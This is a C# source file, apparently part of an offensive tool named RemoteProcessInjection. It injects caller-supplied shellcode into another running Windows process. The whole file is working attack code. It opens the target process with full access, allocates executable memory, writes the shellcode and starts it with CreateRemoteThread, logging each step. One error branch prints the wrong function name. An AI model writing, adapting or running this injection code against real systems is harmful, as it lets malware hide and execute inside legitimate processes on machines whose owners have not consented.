using System;
using System.Diagnostics;

namespace RemoteProcessInjection
{
    class ProcessManager
    {
        public static void Execute(Int32 PID, byte[] Shellcode)
        {
            Logger.Print(Logger.STATUS.INFO, "Checking PID: " + PID);
            Boolean isRunning = GetPIDInfo(PID);
            if (isRunning)
            {
                Logger.Print(Logger.STATUS.INFO, "Attempting to get handle on process...");
                IntPtr hOpenProcess = NativeMethods.OpenProcess(NativeMethods.ProcessAccessFlags.All, true, PID);
                if(hOpenProcess != null && (uint)hOpenProcess.ToInt64() != 0)
                {
                    Logger.Print(Logger.STATUS.GOOD, "Got handle on process!");
                    Logger.Print(Logger.STATUS.INFO, "Attempting to allocate space...");
                    IntPtr hVirtualAlloc = NativeMethods.VirtualAllocEx
                        (
                            hOpenProcess, 
                            IntPtr.Zero, 
                            (uint)Shellcode.Length,
                            NativeMethods.AllocationType.Reserve|NativeMethods.AllocationType.Commit,
                            NativeMethods.MemoryProtection.ExecuteReadWrite
                        );
                    if(hVirtualAlloc != null && (uint)hVirtualAlloc.ToInt64() != 0)
                    {
                        Logger.Print(Logger.STATUS.GOOD, "Allocated space, got new handle!");
                        IntPtr hNumberOfBytesWritten = IntPtr.Zero;
                        Boolean hasWritten = NativeMethods.WriteProcessMemory
                            (
                                hOpenProcess,
                                hVirtualAlloc,
                                Shellcode,
                                Shellcode.Length,
                                out hNumberOfBytesWritten
                            );
                        if (hasWritten)
                        {
                            Logger.Print(Logger.STATUS.GOOD, "Shellcode written!");
                            Logger.Print(Logger.STATUS.INFO, "Attempting to create remote thread...");
                            IntPtr hNewThread = NativeMethods.CreateRemoteThread(hOpenProcess, IntPtr.Zero, 0, hVirtualAlloc, IntPtr.Zero, 0, IntPtr.Zero);
                            if(hNewThread != null)
                            {
                                Logger.Print(Logger.STATUS.GOOD, "Remote thread created with handle!");
                                NativeMethods.CloseHandle(hNewThread);
                            }
                            else
                            {
                                Logger.Print(Logger.STATUS.ERROR, "Error whilst calling WriteProcessMemory()");
                                Utils.ErrorMsg();
                            }
                            NativeMethods.CloseHandle(hOpenProcess);
                            NativeMethods.CloseHandle(hVirtualAlloc);
                        }
                        else
                        {
                            Logger.Print(Logger.STATUS.ERROR, "Error whilst calling WriteProcessMemory()");
                            Utils.ErrorMsg();
                            NativeMethods.CloseHandle(hOpenProcess);
                            NativeMethods.CloseHandle(hVirtualAlloc);
                        }

                    }
                    else
                    {
                        Logger.Print(Logger.STATUS.ERROR, "Error whilst calling VirtualAllocEx()");
                        Utils.ErrorMsg();
                        NativeMethods.CloseHandle(hOpenProcess);
                    }
                }
                else
                {
                    Logger.Print(Logger.STATUS.ERROR, "Error whilst calling OpenProcess()");
                    Utils.ErrorMsg();
                }
            }
        }
        private static Boolean GetPIDInfo(Int32 PID)
        {
            try
            {
                Process p = Process.GetProcessById(PID);
                Logger.Print(Logger.STATUS.GOOD, "Got process name: " + p.ProcessName);
                if (p.HasExited == false)
                {
                    Logger.Print(Logger.STATUS.GOOD, "Process is still running!");
                    return true;
                }
                else
                {
                    Logger.Print(Logger.STATUS.ERROR, "Process has exited...");
                    return false;
                }
            }
            catch (Exception e)
            {
                Logger.Print(Logger.STATUS.ERROR, e.Message);
                return false;
            }
        }
    }
}
